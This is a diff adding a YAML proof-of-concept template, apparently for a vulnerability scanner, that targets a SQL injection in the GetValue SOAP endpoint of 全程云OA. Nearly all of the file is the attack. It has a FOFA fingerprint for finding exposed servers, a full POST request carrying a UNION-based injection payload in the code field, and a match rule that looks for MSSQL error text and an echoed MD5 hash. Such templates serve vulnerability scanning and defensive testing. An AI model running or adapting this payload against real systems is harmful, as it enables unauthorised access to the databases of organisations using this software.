@@ -1,0 +1,25 @@
+id: poc-yaml-quan-cheng-yun-getvalue-sqli
+info:
+  name: 全程云OA GetValue SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全程云OA
+  fofa: body="images/yipeoplehover.png"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /OA/PES/QCPES.asmx
+  headers:
+    SOAPAction: http://tempuri.org/GetValue
+    Content-Type: text/xml; charset=utf-8
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetValue xmlns=\"http://tempuri.org/\">\n      <fk_parid>1</fk_parid>\n\
+    \      <code>1' UNION ALL SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--\
+    \ oCWH</code>\n    </GetValue>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"0x" + t2) && contains(content_type,"text/xml")
+transport: http
